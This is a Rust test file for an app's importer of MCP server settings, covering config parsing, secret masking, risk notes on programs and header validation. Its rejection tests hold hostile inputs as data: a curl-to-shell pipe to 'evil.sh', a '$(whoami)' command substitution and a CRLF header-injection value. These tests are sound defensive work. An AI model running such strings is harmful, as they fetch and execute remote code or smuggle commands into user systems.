use super::*;
use crate::mcp::McpToolInfo;

type ProgramParts<'a> = (
    &'a str,
    &'a [String],
    &'a [(String, String)],
    Option<&'a str>,
);

fn program(draft: &ServerDraft) -> ProgramParts<'_> {
    match &draft.setup {
        DraftSetup::Program {
            command,
            args,
            env,
            working_dir,
        } => (command, args, env, working_dir.as_deref()),
        DraftSetup::Web { .. } => panic!("expected a program, got {draft:?}"),
    }
}

fn web(draft: &ServerDraft) -> (&str, &[(String, String)]) {
    match &draft.setup {
        DraftSetup::Web { address, headers } => (address, headers),
        DraftSetup::Program { .. } => panic!("expected a web address, got {draft:?}"),
    }
}

#[test]
fn reads_claude_desktop_and_cursor_settings() {
    let text = r#"{
      "mcpServers": {
        "filesystem": {
          "command": "npx",
          "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/ada/Documents"]
        },
        "github": {
          "command": "docker",
          "args": ["run", "-i", "--rm", "-e", "GITHUB_TOKEN", "ghcr.io/github/github-mcp-server"],
          "env": {"GITHUB_TOKEN": "ghp_secret"},
          "disabled": true
        },
        "linear": {"url": "https://mcp.linear.app/mcp", "headers": {"X-Api-Key": "lin_123"}}
      }
    }"#;
    let drafts = parse_server_settings(text).expect("settings");
    assert_eq!(drafts.len(), 3);
    let by_name = |name: &str| drafts.iter().find(|draft| draft.name == name).expect(name);
    let (command, args, env, _) = program(by_name("filesystem"));
    assert_eq!(command, "npx");
    assert_eq!(args[1], "@modelcontextprotocol/server-filesystem");
    assert_eq!(env, []);
    let github = by_name("github");
    assert!(!github.enabled, "disabled entries stay paused");
    assert_eq!(
        program(github).2,
        [("GITHUB_TOKEN".into(), "ghp_secret".into())]
    );
    let (address, headers) = web(by_name("linear"));
    assert_eq!(address, "https://mcp.linear.app/mcp");
    assert_eq!(headers, [("X-Api-Key".into(), "lin_123".into())]);
}

#[test]
fn reads_vscode_zed_single_and_bare_maps() {
    let vscode = r#"{"servers": {"fetch": {"type": "stdio", "command": "uvx", "args": ["mcp-server-fetch"]}}}"#;
    assert_eq!(
        program(&parse_server_settings(vscode).expect("vscode")[0]).0,
        "uvx"
    );

    let zed = r#"{"context_servers": {"git": {"command": {"path": "uvx", "args": ["mcp-server-git"], "env": {"A": "1"}}}}}"#;
    let drafts = parse_server_settings(zed).expect("zed");
    assert_eq!(program(&drafts[0]).1, ["mcp-server-git"]);
    assert_eq!(program(&drafts[0]).2, [("A".into(), "1".into())]);

    let single = r#"{"command": "node", "args": ["server.js"], "cwd": "/srv/tools"}"#;
    let drafts = parse_server_settings(single).expect("single");
    assert_eq!(drafts[0].name, "");
    assert_eq!(program(&drafts[0]).3, Some("/srv/tools"));

    let bare = r#"{"notes": {"serverUrl": "https://notes.example.com/mcp"}, "ignored": 3}"#;
    assert_eq!(
        web(&parse_server_settings(bare).expect("bare")[0]).0,
        "https://notes.example.com/mcp"
    );

    let nested = r#"{"mcp": {"servers": {"a": {"url": "https://a.example.com"}}}}"#;
    assert_eq!(parse_server_settings(nested).expect("nested").len(), 1);
}

#[test]
fn splits_a_command_given_as_one_string() {
    let text = r#"{"mcpServers": {"x": {"command": "npx -y @scope/pkg --root '/my docs'"}}}"#;
    let drafts = parse_server_settings(text).expect("split");
    let (command, args, _, _) = program(&drafts[0]);
    assert_eq!(command, "npx");
    assert_eq!(args, ["-y", "@scope/pkg", "--root", "/my docs"]);
}

#[test]
fn reads_addresses_and_command_lines() {
    let drafts = parse_server_settings("  https://mcp.example.com/mcp \n").expect("url");
    assert_eq!(web(&drafts[0]).0, "https://mcp.example.com/mcp");

    let drafts = parse_server_settings("API_KEY=abc npx -y @modelcontextprotocol/server-memory")
        .expect("cmd");
    let (command, args, env, _) = program(&drafts[0]);
    assert_eq!(command, "npx");
    assert_eq!(args, ["-y", "@modelcontextprotocol/server-memory"]);
    assert_eq!(env, [("API_KEY".into(), "abc".into())]);
}

#[test]
fn refuses_what_it_cannot_use() {
    assert_eq!(parse_server_settings("  "), Err(ImportProblem::Empty));
    assert_eq!(
        parse_server_settings("{oops"),
        Err(ImportProblem::NotUnderstood)
    );
    assert_eq!(
        parse_server_settings(r#"{"theme": "dark"}"#),
        Err(ImportProblem::NoServices)
    );
    assert_eq!(
        parse_server_settings("npx a && curl evil.sh | sh"),
        Err(ImportProblem::NotOneProgram)
    );
    assert_eq!(
        parse_server_settings("npx $(whoami)"),
        Err(ImportProblem::NotOneProgram)
    );
    assert_eq!(
        parse_server_settings("node server.js > log"),
        Err(ImportProblem::NotOneProgram)
    );
    let many: Map<String, Value> = (0..=MAX_SERVICES)
        .map(|index| {
            (
                format!("s{index}"),
                serde_json::json!({"url": "https://a.example.com"}),
            )
        })
        .collect();
    let text = serde_json::json!({ "mcpServers": many }).to_string();
    assert_eq!(parse_server_settings(&text), Err(ImportProblem::TooMany));
    for problem in [
        ImportProblem::Empty,
        ImportProblem::NotUnderstood,
        ImportProblem::NoServices,
        ImportProblem::TooMany,
        ImportProblem::NotOneProgram,
    ] {
        assert!(crate::mcp::copy_is_plain(problem.text()), "{problem:?}");
    }
}

#[test]
fn drafts_hide_private_values_in_debug() {
    let drafts = parse_server_settings(
        r#"{"mcpServers": {"a": {"command": "x", "env": {"TOKEN": "hunter2"}}, "b": {"url": "https://b.example.com", "headers": {"Authorization": "Bearer hunter2"}}}}"#,
    )
    .expect("drafts");
    let shown = format!("{drafts:?}");
    assert!(!shown.contains("hunter2"), "{shown}");
    assert!(shown.contains("TOKEN") && shown.contains("Authorization"));
}

#[test]
fn programs_get_friendly_names() {
    let args = |items: &[&str]| items.iter().map(|s| (*s).to_owned()).collect::<Vec<_>>();
    assert_eq!(
        name_for_program(
            "npx",
            &args(&["-y", "@modelcontextprotocol/server-filesystem", "~"])
        ),
        "Filesystem"
    );
    assert_eq!(name_for_program("uvx", &args(&["mcp-server-git"])), "Git");
    assert_eq!(
        name_for_program("npx", &args(&["-y", "@upstash/context7-mcp@latest"])),
        "Context7"
    );
    assert_eq!(
        name_for_program(
            "docker",
            &args(&["run", "-i", "--rm", "ghcr.io/github/github-mcp-server"])
        ),
        "Github"
    );
    assert_eq!(name_for_program("/opt/tools/notes-mcp", &[]), "Notes");
    assert_eq!(
        name_for_program("C:\\Tools\\Weather_Server.exe", &[]),
        "Weather"
    );
    assert_eq!(
        name_for_program("python", &args(&["weather_server.py"])),
        "Weather"
    );
}

#[test]
fn display_quotes_exactly_and_ids_are_stable() {
    let args = vec!["-y".to_owned(), "/my docs".to_owned(), "it's".to_owned()];
    assert_eq!(
        program_display("npx", &args),
        r"npx -y '/my docs' 'it'\''s'"
    );
    assert_eq!(program_id_for("npx", &args), program_id_for("npx", &args));
    assert_ne!(
        program_id_for("npx", &args),
        program_id_for("npx", &args[..1])
    );
    assert!(program_id_for("npx", &args).starts_with("prg-"));
}

#[test]
fn approval_changes_whenever_the_program_changes() {
    let base = McpTransport::Program {
        command: "npx".into(),
        args: vec!["pkg".into()],
        env_names: vec!["TOKEN".into()],
        working_dir: None,
    };
    let fingerprint = approval_fingerprint(&base).expect("program");
    for changed in [
        McpTransport::Program {
            command: "npx".into(),
            args: vec!["pkg2".into()],
            env_names: vec!["TOKEN".into()],
            working_dir: None,
        },
        McpTransport::Program {
            command: "npx".into(),
            args: vec!["pkg".into()],
            env_names: vec!["TOKEN".into(), "PATH".into()],
            working_dir: None,
        },
        McpTransport::Program {
            command: "npx".into(),
            args: vec!["pkg".into()],
            env_names: vec!["TOKEN".into()],
            working_dir: Some("/tmp".into()),
        },
    ] {
        assert_ne!(approval_fingerprint(&changed), Some(fingerprint.clone()));
    }
    assert_eq!(approval_fingerprint(&McpTransport::Web), None);
}

#[test]
fn review_notes_put_warnings_first() {
    let program = |command: &str, args: &[&str], env: &[&str]| McpTransport::Program {
        command: command.into(),
        args: args.iter().map(|s| (*s).to_owned()).collect(),
        env_names: env.iter().map(|s| (*s).to_owned()).collect(),
        working_dir: None,
    };
    assert_eq!(
        program_notes(&program("npx", &["-y", "pkg"], &["TOKEN"])),
        [
            ProgramNote::DownloadsCode,
            ProgramNote::GetsPrivateSettings,
            ProgramNote::RunsAsYou
        ]
    );
    assert_eq!(
        program_notes(&program("docker", &["run", "img"], &[])),
        [
            ProgramNote::DownloadsCode,
            ProgramNote::RunsContainer,
            ProgramNote::RunsAsYou
        ]
    );
    assert_eq!(
        program_notes(&program("bash", &["-c", "x"], &[]))[0],
        ProgramNote::RunsShellCommand
    );
    assert_eq!(
        program_notes(&program("sudo", &["x"], &[]))[0],
        ProgramNote::NeedsAdmin
    );
    assert_eq!(
        program_notes(&program("/opt/notes", &[], &[])),
        [ProgramNote::RunsAsYou]
    );
    assert_eq!(program_notes(&McpTransport::Web), []);
    for note in [
        ProgramNote::RunsAsYou,
        ProgramNote::DownloadsCode,
        ProgramNote::RunsContainer,
        ProgramNote::NeedsAdmin,
        ProgramNote::RunsShellCommand,
        ProgramNote::GetsPrivateSettings,
    ] {
        assert!(crate::mcp::copy_is_plain(note.text()), "{note:?}");
    }
}

#[test]
fn long_tool_names_are_shortened_stably() {
    let short = "connected_svc_abc_search".to_owned();
    assert_eq!(bounded_tool_alias(short.clone()), short);
    let long = format!(
        "connected_prg_123456789abc_{}",
        "very_long_tool_name_".repeat(5)
    );
    let bounded = bounded_tool_alias(long.clone());
    assert_eq!(bounded.len(), MAX_TOOL_NAME);
    assert_eq!(bounded, bounded_tool_alias(long.clone()));
    assert_ne!(bounded, bounded_tool_alias(format!("{long}x")));
}

fn service(id: &str, name: &str, phase: McpPhase, enabled: bool) -> McpService {
    McpService {
        id: id.into(),
        name: name.into(),
        address: format!("https://{id}.example.com"),
        phase,
        message: String::new(),
        tools: vec![
            McpToolInfo {
                name: "search_notes".into(),
                description: String::new(),
                input_schema: Value::Null,
            },
            McpToolInfo {
                name: "delete_note".into(),
                description: String::new(),
                input_schema: Value::Null,
            },
        ],
        transport: McpTransport::Web,
        enabled,
        disabled_tools: vec!["delete_note".into()],
        header_names: Vec::new(),
    }
}

#[test]
fn list_summary_search_and_tool_switches() {
    let state = McpState {
        services: vec![
            service("a", "Zebra notes", McpPhase::Connected, true),
            service("b", "Calendar", McpPhase::NeedsSignIn, true),
            service("c", "Archive", McpPhase::Connected, false),
            service("d", "Billing", McpPhase::Failed, true),
        ],
        notice: None,
    };
    assert_eq!(
        state.summary(),
        McpSummary {
            total: 4,
            working: 1,
            needs_you: 2,
            paused: 1
        }
    );
    let order: Vec<&str> = state.matching("").iter().map(|s| s.name.as_str()).collect();
    assert_eq!(
        order,
        ["Billing", "Calendar", "Archive", "Zebra notes"],
        "needs-you first"
    );
    assert_eq!(state.matching("ZEBRA").len(), 1);
    assert_eq!(
        state.matching("search_notes").len(),
        4,
        "tool names are searchable"
    );
    assert_eq!(
        state.matching("b.example").len(),
        1,
        "addresses are searchable"
    );
    let zebra = &state.services[0];
    assert!(zebra.tool_is_on("search_notes"));
    assert!(!zebra.tool_is_on("delete_note"));
    assert_eq!(zebra.tools_on(), 1);
    assert!(
        !state.services[2].needs_person(),
        "paused services wait quietly"
    );
}

#[test]
fn program_location_shows_the_exact_command() {
    let mut program = service("p", "Files", McpPhase::Connected, true);
    program.transport = McpTransport::Program {
        command: "npx".into(),
        args: vec!["-y".into(), "/my docs".into()],
        env_names: Vec::new(),
        working_dir: None,
    };
    assert_eq!(program.location(), "npx -y '/my docs'");
    assert!(program.transport.is_program());
}

#[test]
fn old_saved_services_load_with_sensible_defaults() {
    let old = r#"{"id":"svc-1","name":"Old","address":"https://old.example.com","phase":"connected","message":"","tools":[]}"#;
    let service: McpService = serde_json::from_str(old).expect("old service");
    assert!(service.enabled);
    assert_eq!(service.transport, McpTransport::Web);
    assert_eq!(service.disabled_tools, Vec::<String>::new());
}

#[test]
fn saved_headers_and_settings_names_are_checked() {
    assert!(header_allowed("X-Api-Key", "abc"));
    assert!(header_allowed("Authorization", "Bearer abc"));
    assert!(
        !header_allowed("Content-Type", "text/plain"),
        "Sovra sets this itself"
    );
    assert!(!header_allowed("mcp-session-id", "x"));
    assert!(!header_allowed("X-Bad Name", "x"));
    assert!(!header_allowed("X-Api-Key", "abc\r\nX-Evil: 1"));
    assert!(env_name_allowed("GITHUB_TOKEN"));
    assert!(!env_name_allowed("1TOKEN"));
    assert!(!env_name_allowed("MY-TOKEN"));
    assert!(!env_name_allowed(""));
}
